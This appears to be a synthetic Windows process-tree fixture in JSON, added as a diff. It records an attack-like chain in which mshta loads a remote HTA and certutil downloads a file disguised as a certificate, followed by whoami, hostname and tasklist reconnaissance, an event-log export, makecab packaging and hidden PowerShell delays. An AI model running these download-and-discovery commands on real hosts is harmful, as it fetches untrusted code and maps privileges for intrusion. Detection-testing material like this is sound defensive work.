@@ -1,0 +1,388 @@
+{
+  "pid": 360106,
+  "ppid": 0,
+  "name": "powershell.exe",
+  "command": "powershell.exe -NoProfile -File \"C:\\IT\\Scripts\\Runbook_d7fd88b0.ps1\"",
+  "children": [
+    {
+      "pid": 360108,
+      "ppid": 360106,
+      "name": "cmd.exe",
+      "command": "cmd.exe /k \"ver\"",
+      "children": [
+        {
+          "pid": 360109,
+          "ppid": 360108,
+          "name": "mshta.exe",
+          "command": "mshta.exe \"http://bldsrv.corp.local/diag/collect.hta\"",
+          "children": [
+            {
+              "pid": 360116,
+              "ppid": 360109,
+              "name": "ping.exe",
+              "command": "ping.exe -n 19 127.0.0.1 > nul",
+              "children": [
+                {
+                  "pid": 360120,
+                  "ppid": 360116,
+                  "name": "certutil.exe",
+                  "command": "certutil.exe -urlcache -split -f \"http://cdn.contoso-updates.com/pki/intermediate.cer\" \"C:\\Users\\Public\\agent.cab\"",
+                  "children": [
+                    {
+                      "pid": 360123,
+                      "ppid": 360120,
+                      "name": "ping.exe",
+                      "command": "ping.exe -n 21 127.0.0.1 > nul",
+                      "children": [
+                        {
+                          "pid": 360129,
+                          "ppid": 360123,
+                          "name": "hostname.exe",
+                          "command": "hostname.exe > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\host_9e3360c5.txt\"",
+                          "children": [
+                            {
+                              "pid": 360135,
+                              "ppid": 360129,
+                              "name": "choice.exe",
+                              "command": "choice.exe /d y /t 7 > nul",
+                              "children": [
+                                {
+                                  "pid": 360139,
+                                  "ppid": 360135,
+                                  "name": "tasklist.exe",
+                                  "command": "tasklist.exe /svc",
+                                  "children": [
+                                    {
+                                      "pid": 360143,
+                                      "ppid": 360139,
+                                      "name": "whoami.exe",
+                                      "command": "whoami.exe /priv > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\who_e8994de7.txt\"",
+                                      "children": [
+                                        {
+                                          "pid": 360144,
+                                          "ppid": 360143,
+                                          "name": "choice.exe",
+                                          "command": "choice.exe /d y /t 7 > nul",
+                                          "children": [
+                                            {
+                                              "pid": 360149,
+                                              "ppid": 360144,
+                                              "name": "whoami.exe",
+                                              "command": "whoami.exe /priv",
+                                              "children": [
+                                                {
+                                                  "pid": 360152,
+                                                  "ppid": 360149,
+                                                  "name": "choice.exe",
+                                                  "command": "choice.exe /d y /t 19 > nul",
+                                                  "children": []
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    },
+                                    {
+                                      "pid": 360154,
+                                      "ppid": 360139,
+                                      "name": "timeout.exe",
+                                      "command": "timeout.exe /t 18 /nobreak",
+                                      "children": [
+                                        {
+                                          "pid": 360159,
+                                          "ppid": 360154,
+                                          "name": "wevtutil.exe",
+                                          "command": "wevtutil.exe epl \"System\" \"C:\\ProgramData\\Northwind\\Logs\\System_f989cc4f.evtx\"",
+                                          "children": [
+                                            {
+                                              "pid": 360160,
+                                              "ppid": 360159,
+                                              "name": "ping.exe",
+                                              "command": "ping.exe -n 25 127.0.0.1 > nul",
+                                              "children": [
+                                                {
+                                                  "pid": 360163,
+                                                  "ppid": 360160,
+                                                  "name": "ping.exe",
+                                                  "command": "ping.exe -n 12 127.0.0.1 > nul",
+                                                  "children": [
+                                                    {
+                                                      "pid": 360168,
+                                                      "ppid": 360163,
+                                                      "name": "makecab.exe",
+                                                      "command": "makecab.exe \"C:\\Build\\dist\\9167defe\\diag.txt\" \"C:\\Build\\dist\\9167defe\\diag.cab\"",
+                                                      "children": [
+                                                        {
+                                                          "pid": 360175,
+                                                          "ppid": 360168,
+                                                          "name": "powershell.exe",
+                                                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 12\"",
+                                                          "children": [
+                                                            {
+                                                              "pid": 360186,
+                                                              "ppid": 360175,
+                                                              "name": "ping.exe",
+                                                              "command": "ping.exe -n 22 127.0.0.1 > nul",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 360189,
+                                                                  "ppid": 360186,
+                                                                  "name": "hostname.exe",
+                                                                  "command": "hostname.exe > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\host_4815873c.txt\"",
+                                                                  "children": [
+                                                                    {
+                                                                      "pid": 360192,
+                                                                      "ppid": 360189,
+                                                                      "name": "hostname.exe",
+                                                                      "command": "hostname.exe",
+                                                                      "children": [
+                                                                        {
+                                                                          "pid": 360197,
+                                                                          "ppid": 360192,
+                                                                          "name": "ping.exe",
+                                                                          "command": "ping.exe -n 21 127.0.0.1 > nul",
+                                                                          "children": [
+                                                                            {
+                                                                              "pid": 360203,
+                                                                              "ppid": 360197,
+                                                                              "name": "whoami.exe",
+                                                                              "command": "whoami.exe /priv > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\who_add9d0d6.txt\"",
+                                                                              "children": [
+                                                                                {
+                                                                                  "pid": 360207,
+                                                                                  "ppid": 360203,
+                                                                                  "name": "whoami.exe",
+                                                                                  "command": "whoami.exe /all",
+                                                                                  "children": [
+                                                                                    {
+                                                                                      "pid": 360211,
+                                                                                      "ppid": 360207,
+                                                                                      "name": "powershell.exe",
+                                                                                      "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'hostname.exe' -ArgumentList '> \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\host_f17f971f.txt\"' -Wait\"",
+                                                                                      "children": [
+                                                                                        {
+                                                                                          "pid": 360217,
+                                                                                          "ppid": 360211,
+                                                                                          "name": "whoami.exe",
+                                                                                          "command": "whoami.exe /all",
+                                                                                          "children": [
+                                                                                            {
+                                                                                              "pid": 360220,
+                                                                                              "ppid": 360217,
+                                                                                              "name": "choice.exe",
+                                                                                              "command": "choice.exe /d y /t 2 > nul",
+                                                                                              "children": [
+                                                                                                {
+                                                                                                  "pid": 360221,
+                                                                                                  "ppid": 360220,
+                                                                                                  "name": "timeout.exe",
+                                                                                                  "command": "timeout.exe /t 12 /nobreak",
+                                                                                                  "children": []
+                                                                                                }
+                                                                                              ]
+                                                                                            }
+                                                                                          ]
+                                                                                        }
+                                                                                      ]
+                                                                                    }
+                                                                                  ]
+                                                                                },
+                                                                                {
+                                                                                  "pid": 360226,
+                                                                                  "ppid": 360203,
+                                                                                  "name": "whoami.exe",
+                                                                                  "command": "whoami.exe",
+                                                                                  "children": [
+                                                                                    {
+                                                                                      "pid": 360229,
+                                                                                      "ppid": 360226,
+                                                                                      "name": "whoami.exe",
+                                                                                      "command": "whoami.exe",
+                                                                                      "children": [
+                                                                                        {
+                                                                                          "pid": 360235,
+                                                                                          "ppid": 360229,
+                                                                                          "name": "ping.exe",
+                                                                                          "command": "ping.exe -n 13 127.0.0.1 > nul",
+                                                                                          "children": [
+                                                                                            {
+                                                                                              "pid": 360240,
+                                                                                              "ppid": 360235,
+                                                                                              "name": "cmd.exe",
+                                                                                              "command": "cmd.exe /c \"hostname.exe > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\host_f374c3c6.txt\"\"",
+                                                                                              "children": [
+                                                                                                {
+                                                                                                  "pid": 360244,
+                                                                                                  "ppid": 360240,
+                                                                                                  "name": "hostname.exe",
+                                                                                                  "command": "hostname.exe > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\host_39a8eab5.txt\"",
+                                                                                                  "children": [
+                                                                                                    {
+                                                                                                      "pid": 360245,
+                                                                                                      "ppid": 360244,
+                                                                                                      "name": "hostname.exe",
+                                                                                                      "command": "hostname.exe",
+                                                                                                      "children": [
+                                                                                                        {
+                                                                                                          "pid": 360251,
+                                                                                                          "ppid": 360245,
+                                                                                                          "name": "powershell.exe",
+                                                                                                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 4\"",
+                                                                                                          "children": [
+                                                                                                            {
+                                                                                                              "pid": 360253,
+                                                                                                              "ppid": 360251,
+                                                                                                              "name": "hostname.exe",
+                                                                                                              "command": "hostname.exe > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\host_877e3685.txt\"",
+                                                                                                              "children": [
+                                                                                                                {
+                                                                                                                  "pid": 360257,
+                                                                                                                  "ppid": 360253,
+                                                                                                                  "name": "powershell.exe",
+                                                                                                                  "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'whoami.exe' -ArgumentList '/groups > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\who_32a94d57.txt\"' -Wait\"",
+                                                                                                                  "children": [
+                                                                                                                    {
+                                                                                                                      "pid": 360260,
+                                                                                                                      "ppid": 360257,
+                                                                                                                      "name": "hostname.exe",
+                                                                                                                      "command": "hostname.exe > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\host_9159ff57.txt\"",
+                                                                                                                      "children": [
+                                                                                                                        {
+                                                                                                                          "pid": 360267,
+                                                                                                                          "ppid": 360260,
+                                                                                                                          "name": "hostname.exe",
+                                                                                                                          "command": "hostname.exe > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\host_a40820a4.txt\"",
+                                                                                                                          "children": [
+                                                                                                                            {
+                                                                                                                              "pid": 360273,
+                                                                                                                              "ppid": 360267,
+                                                                                                                              "name": "whoami.exe",
+                                                                                                                              "command": "whoami.exe /groups > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\who_d20e2525.txt\"",
+                                                                                                                              "children": [
+                                                                                                                                {
+                                                                                                                                  "pid": 360276,
+                                                                                                                                  "ppid": 360273,
+                                                                                                                                  "name": "whoami.exe",
+                                                                                                                                  "command": "whoami.exe",
+                                                                                                                                  "children": [
+                                                                                                                                    {
+                                                                                                                                      "pid": 360278,
+                                                                                                                                      "ppid": 360276,
+                                                                                                                                      "name": "whoami.exe",
+                                                                                                                                      "command": "whoami.exe /all > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\who_23e87d4c.txt\"",
+                                                                                                                                      "children": [
+                                                                                                                                        {
+                                                                                                                                          "pid": 360284,
+                                                                                                                                          "ppid": 360278,
+                                                                                                                                          "name": "hostname.exe",
+                                                                                                                                          "command": "hostname.exe",
+                                                                                                                                          "children": [
+                                                                                                                                            {
+                                                                                                                                              "pid": 360285,
+                                                                                                                                              "ppid": 360284,
+                                                                                                                                              "name": "hostname.exe",
+                                                                                                                                              "command": "hostname.exe > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\host_786163d3.txt\"",
+                                                                                                                                              "children": [
+                                                                                                                                                {
+                                                                                                                                                  "pid": 360289,
+                                                                                                                                                  "ppid": 360285,
+                                                                                                                                                  "name": "hostname.exe",
+                                                                                                                                                  "command": "hostname.exe",
+                                                                                                                                                  "children": [
+                                                                                                                                                    {
+                                                                                                                                                      "pid": 360295,
+                                                                                                                                                      "ppid": 360289,
+                                                                                                                                                      "name": "powershell.exe",
+                                                                                                                                                      "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'whoami.exe' -ArgumentList '> \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\who_6d54a665.txt\"' -Wait\"",
+                                                                                                                                                      "children": []
+                                                                                                                                                    }
+                                                                                                                                                  ]
+                                                                                                                                                }
+                                                                                                                                              ]
+                                                                                                                                            }
+                                                                                                                                          ]
+                                                                                                                                        }
+                                                                                                                                      ]
+                                                                                                                                    }
+                                                                                                                                  ]
+                                                                                                                                }
+                                                                                                                              ]
+                                                                                                                            }
+                                                                                                                          ]
+                                                                                                                        }
+                                                                                                                      ]
+                                                                                                                    }
+                                                                                                                  ]
+                                                                                                                }
+                                                                                                              ]
+                                                                                                            }
+                                                                                                          ]
+                                                                                                        }
+                                                                                                      ]
+                                                                                                    }
+                                                                                                  ]
+                                                                                                }
+                                                                                              ]
+                                                                                            }
+                                                                                          ]
+                                                                                        }
+                                                                                      ]
+                                                                                    }
+                                                                                  ]
+                                                                                }
+                                                                              ]
+                                                                            }
+                                                                          ]
+                                                                        }
+                                                                      ]
+                                                                    }
+                                                                  ]
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 360182,
+      "ppid": 360106,
+      "name": "hostname.exe",
+      "command": "hostname.exe > \"C:\\Users\\kiran.verma\\AppData\\Local\\Temp\\host_49ccad77.txt\"",
+      "children": [
+        {
+          "pid": 360185,
+          "ppid": 360182,
+          "name": "hostname.exe",
+          "command": "hostname.exe",
+          "children": []
+        }
+      ]
+    }
+  ]
+}
